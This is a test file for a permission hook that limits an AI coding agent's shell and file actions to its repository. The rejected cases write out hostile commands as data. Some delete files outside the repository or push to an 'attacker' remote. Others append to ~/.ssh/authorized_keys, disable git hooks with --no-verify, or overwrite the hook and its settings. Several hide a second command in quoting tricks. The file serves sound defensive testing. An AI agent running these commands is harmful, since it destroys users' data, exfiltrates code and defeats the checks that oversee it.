"""Tests of the PermissionRequest hook tools/claude/allow_in_repo.py (minimal allow list).

The rejected cases include each repro of the adversarial reviews of 2026-10-30 (reviews/2026-10-30-*.md). The hook
only reads the JSON; no candidate command runs. Outside paths are built at run time (the hygiene check keeps
private paths out of the repository).
"""
import json
import os
import subprocess
import sys
from pathlib import Path

import pytest

REPO = Path(os.path.realpath(Path(__file__).resolve().parents[1]))
HOOK = REPO / "tools" / "claude" / "allow_in_repo.py"
HOME = str(Path.home())
OUT = str(REPO.parent / "Documents")
SCRATCH = f"/private/tmp/claude-{os.getuid()}"


def decision(tool: str, tool_input: dict, cwd: Path | str = REPO) -> str | None:
    data = {"cwd": str(cwd), "tool_name": tool, "tool_input": tool_input}
    env = {**os.environ, "ALLOW_IN_REPO_NOLOG": "1"}
    r = subprocess.run([sys.executable, str(HOOK)], input=json.dumps(data), capture_output=True, text=True,
                       env=env, timeout=30)
    assert r.returncode == 0, r.stderr
    return json.loads(r.stdout)["hookSpecificOutput"]["decision"]["behavior"] if r.stdout.strip() else None


def approves(tool: str, tool_input: dict, cwd: Path | str = REPO) -> bool:
    data = {"cwd": str(cwd), "tool_name": tool, "tool_input": tool_input}
    env = {**os.environ, "ALLOW_IN_REPO_NOLOG": "1"}
    r = subprocess.run([sys.executable, str(HOOK)], input=json.dumps(data), capture_output=True, text=True,
                       env=env, timeout=30)
    assert r.returncode == 0, r.stderr
    if not r.stdout.strip():
        return False
    return json.loads(r.stdout)["hookSpecificOutput"]["decision"]["behavior"] == "allow"


@pytest.mark.parametrize("command", [
    "rm scratch.txt", "rm -rf build", "rm -f meow_gpu/bench/old.json", "rmdir results/a", "mv a.txt docs/b.txt",
    "git rm --cached tools/remote.sh", "git rm -r old", "git mv docs/a.md docs/b.md",
])
def test_inside_is_approved(command):
    assert approves("Bash", {"command": command}), command


REJECTED = [
    # review 1
    "cd && rm -rf Documents", "cd; rm -rf Documents", "cd - && rm -rf x", "rm -rf ~-/x", "cd docs && ln -s .. ../up",
    f"echo a#b && rm -rf {OUT}", f"rm -rf x#y {OUT}", "cp a b#c ~/.ssh/authorized_keys",
    f"rm -rf {{{OUT},x}}", "rm -rf {~,x}/Documents", f"tar -xf a.tar -C{HOME}", f"git diff --output={OUT}",
    "=ssh gpuhost uptime", "=sudo -n true", "env bash -c 'rm -rf x'", "uv run python -c 'import os'",
    "ls *(e:'rm -rf x':)", "git -c alias.x='rm -rf x' x", "printf x > x.sh && bash x.sh",
    f"rm -rf {SCRATCH}/-Users-someone-other/x", "git push https://example.com/attacker/repo main",
    "git push origin :main", "git push --force origin main", "uv cache clean", "git config --global user.name x",
    "git commit --no-verify -m x", "git commit -n -m x", "git -c core.hooksPath=/dev/null commit -m x",
    "rm -rf .git", "rm -rf .", "rm tools/review.sh", "cp x tools/claude/allow_in_repo.py", "rm ../x", "rm $HOME/x",
    "rm `echo /x`", "sudo rm a", "rm 'a'", "rm a\nrm b", "/bin/rm a", "command rm x",
    # review 2
    "cat x.txt > tools/claude/allow_in_repo.py", "cat x.json > .claude/settings.json", "cat x >> .git/config",
    "echo exit 0 > .githooks/pre-commit", "git log -1 --format=%B --output=.githooks/pre-commit",
    "rm -rf .GIT", "rm -rf .Git/hooks", "rm TOOLS/claude/allow_in_repo.py", "rm -rf tools", "mv tools x",
    "printf -v PATH %s bin && git status", f"printf -v CDPATH %s/.. {REPO} && cd Documents && rm -rf x",
    "echo x >=uv", "cp -R .venv/bin d && echo > d/python", "cp -s ../.zshrc ../z", "cp -RL a t",
    "find -files0-from list -name x -delete", "find . -delete",
    "git rm -rf tools/claude .githooks tools/review.sh", "git rm -r tools", "git clean -fdX .claude",
    "git init --separate-git-dir=foo", "git commit --no-veri -m x", "git reset --hard stash",
    "git stash", "git push origin main", "rm -rf reviews", "rm reviews/2026-10-30-fd9afa3884ee.md",
    "mv reviews x", "rm tools/hygiene.py", "rm -rf .local/x", "rm a ; rm b", "rm a & rm b", "rm a | cat", "rm -i a", "rm --no-preserve-root a",
]


@pytest.mark.parametrize("command", REJECTED)
def test_rejected(command):
    assert not approves("Bash", {"command": command}), command


def test_symlink_component_is_rejected(tmp_path):
    link = REPO / ".local" / "test-link-to-outside"
    link.parent.mkdir(exist_ok=True)
    if link.is_symlink() or link.exists():
        link.unlink()
    link.symlink_to(tmp_path)
    try:
        assert not approves("Bash", {"command": "rm -rf .local/test-link-to-outside/x"})
        assert not approves("Bash", {"command": "rm .local/test-link-to-outside"})
        assert not approves("Write", {"file_path": str(link / "x.txt")})
    finally:
        link.unlink()


def test_cwd_outside_is_rejected():
    assert not approves("Bash", {"command": "rm a"}, cwd=REPO.parent)
    assert not approves("Bash", {"command": "rm a"}, cwd=SCRATCH)


def test_file_tools():
    assert approves("Write", {"file_path": str(REPO / "x.md")})
    assert approves("Edit", {"file_path": str(REPO / "docs" / "x.md")})
    assert approves("Write", {"file_path": str(REPO / "reviews" / "2026-10-30-000000000000.md")})
    for bad in [REPO.parent / "x.md", f"{REPO}/../x.md", REPO / "tools" / "claude" / "allow_in_repo.py",
                REPO / ".claude" / "settings.json", REPO / ".git" / "hooks" / "pre-commit",
                REPO / ".githooks" / "pre-commit", REPO / "tools" / "review.sh", REPO / "tools" / "hygiene.py",
                REPO / "TOOLS" / "claude" / "allow_in_repo.py", REPO / ".Claude" / "settings.json",
                f"{SCRATCH}/x", "relative.txt"]:
        assert not approves("Write", {"file_path": str(bad)}), bad


def test_other_tools_are_rejected():
    assert not approves("WebFetch", {"url": "https://example.com"})


def test_no_dialog_in_this_project():
    """In the repo and in the project scratchpad, a call that is not approved is denied (never left to a dialog);
    in other folders the hook gives no decision."""
    project_scratch = f"{SCRATCH}/-" + str(REPO).strip("/").replace("/", "-") + "/session/scratchpad"
    assert decision("Bash", {"command": "git reset --hard"}) == "deny"
    assert decision("Bash", {"command": "rm -rf x"}, cwd=project_scratch) == "deny"
    assert decision("Write", {"file_path": str(REPO.parent / "x.md")}) == "deny"
    assert decision("Bash", {"command": "rm a"}) == "allow"
    assert decision("Bash", {"command": "rm a"}, cwd=REPO.parent) is None
    assert decision("Bash", {"command": "rm -rf x"}, cwd=f"{SCRATCH}/-Users-someone-other/s") is None
